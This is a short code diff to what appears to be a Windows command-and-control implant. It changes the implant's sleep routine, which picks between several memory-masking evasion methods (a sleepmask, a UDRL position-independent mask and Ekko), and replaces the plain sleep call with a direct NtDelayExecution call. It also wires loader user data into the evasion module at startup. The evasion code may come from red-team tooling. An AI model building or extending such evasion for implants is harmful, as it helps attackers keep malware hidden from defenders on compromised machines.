@@ -385,7 +385,13 @@ auto declfn instance::sleep_with_jitter() -> void {
         sleep_time = sleep_time - jitter_range / 2 + jitter;
     }
 
-#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS
+#if SLEEP_MASK_TYPE == MASK_NONE
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_time ) * 10000LL;
+        ntdll.NtDelayExecution( FALSE, &delay );
+    }
+#elif SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS
     evasion_sleepmask_vs_sleep( *this, sleep_time );
 #elif SLEEP_MASK_TYPE == MASK_UDRL
     /* UDRL sleep mask: delegates to the standalone PIC mask module
@@ -403,7 +409,11 @@ auto declfn instance::sleep_with_jitter() -> void {
     evasion_ekko_sleep( *this, sleep_time );
 #else
     evasion_pre_sleep( *this );
-    SleepMs( sleep_time );
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_time ) * 10000LL;
+        ntdll.NtDelayExecution( FALSE, &delay );
+    }
     evasion_post_sleep( *this );
 #endif
 }
@@ -935,7 +945,6 @@ auto declfn instance::start(
     DBG_PRINTF( "running from %ls (PID: %d)\n",
         NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
         NtCurrentTeb()->ClientId.UniqueProcess );
-
     // parse embedded config
     if ( !parse_config() ) {
         DBG_PRINTF( "config parse failed\n" );
@@ -950,6 +959,9 @@ auto declfn instance::start(
 
     // initialize evasion modules
     evasion_on_init( *this );
+
+    if ( evasion.udrl_user_data != arg )
+        evasion.udrl_user_data = arg;
 
     DBG_PRINTF( "crypto init succeeded, initializing transport...\n" );
 
